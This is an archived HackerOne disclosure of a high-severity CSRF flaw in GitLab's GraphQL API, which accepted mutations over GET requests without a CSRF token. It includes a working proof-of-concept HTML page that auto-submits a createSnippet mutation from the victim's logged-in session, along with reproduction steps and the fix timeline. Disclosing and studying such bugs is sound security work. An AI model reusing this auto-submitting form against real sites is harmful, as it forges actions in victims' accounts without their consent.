---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-request-forgery-csrf
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Cross-Site Request Forgery (CSRF)"
enriched: true
body: true
date: 2021-08-02
submitted: 2021-03-10T16:49:12.826Z
bounty_usd: 3370
votes: 88
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "az3z3l"
source: "https://hackerone.com/reports/1122408"
title: "CSRF on /api/graphql allows executing mutations through GET requests"
---
# CSRF on /api/graphql allows executing mutations through GET requests

> **Severity:** High | **Bounty:** 3,370 USD | **Votes:** 88 | **Program:** GitLab | **Disclosed:** 2021-08-02

- Report: [https://hackerone.com/reports/1122408](https://hackerone.com/reports/1122408)
- CWE: Cross-Site Request Forgery (CSRF)
- Submitted: 2021-03-10T16:49:12.826Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Mutations are `edit` or `create`  queries used in Graphql. Gitlab prevents CSRF in this functionality by sending a POST request with a X-CSRF-Token header. The bug I found here was that, when we send a GET request, the backend does not expect the X-CSRF-Token header. Using this, an attacker could leverage this to bypass the existing CSRF protection


### Code for Testing

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="referrer" content="none">
    <meta name="referrer" content="no-referrer">
</head>
<body>
      <form action="https://gitlab.com/api/graphql/" id="csrf-form" method="GET">
        <input name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $input) {    errors    snippet {      webUrl      __typename    }    needsCaptchaResponse    captchaSiteKey    __typename  }}">
        <input name="variables" value='{"input":{"title":"Tesssst Snippet","description":"Hello World","visibilityLevel":"public","blobActions":[{"action":"create","previousPath":"readme.md","content":"reading this.md","filePath":"readme.md"}],"uploadedFiles":[],"projectPath":""}}'>
    </form>


    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>
```
This exploit would create a snippet named `Tesssst Snippet` on the user's account. 


### Steps to Reproduce

1. Host this file
2. Login to gitlab
3. Open the link to that html
4. Check the snippets for the logged in user. 


### Impact

The attacker could control bypass the existing CSRF check on the graphql endpoint.


### POC

Attached the request and response screenshot



### What is the expected *correct* behavior?

The backend must check the existence of csrf tokens for GET requests as well.

## Impact

The attacker could control bypass the existing CSRF check on the graphql endpoint.

## Timeline

- **Report Filed**
- **2021-03-10** @gitlab-securitybot: Hi @az3z3l,

Thank you for submitting this report! We will investigate the issue as soon as
possible, and should get back within a week.

Please do not submit your report or ask about its status through additional
channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2021-03-11** @h1_analyst_amey: Hi @az3z3l,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@forest_dweller
- **Report Title Updated**
- **Report Severity Updated**
- **Report Triaged**
- **Report Severity Updated**
- **Bounty Awarded**
- **2021-03-13** @gitlab-securitybot: ETA for fix:

Hi @az3z3l,

The issue you reported is currently scheduled to be fixed by 2021-06-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **External User Joined**
- **External User Joined**
- **2021-07-01** @az3z3l: Hi @dcouture,

I'm not able to reproduce the bug anymore. Looks like it's resolved?

Regards,
Yaswant
- **Report Severity Updated**
- **Report Resolved**
- **Bounty Awarded**
- **2021-07-02** @az3z3l: Hi @dcouture,
Thanks for the bounty. Gitlab's security releases page has credited the wrong user for this report. Could you please check this - [https://about.gitlab.com/releases/2021/07/01/security-release-gitlab-14-0-2-released/#csrf-on-graphql-api-allows-executing-mutations-through-get-requests](https://about.gitlab.com/releases/2021/07/01/security-release-gitlab-14-0-2-released/#csrf-on-graphql-api-allows-executing-mutations-through-get-requests)
Regards,
Yaswant
- **2021-07-12** @dcouture: Thanks for letting us know @az3z3l! I opened https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/86222 and the change will make its way to the blog post during the day.
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
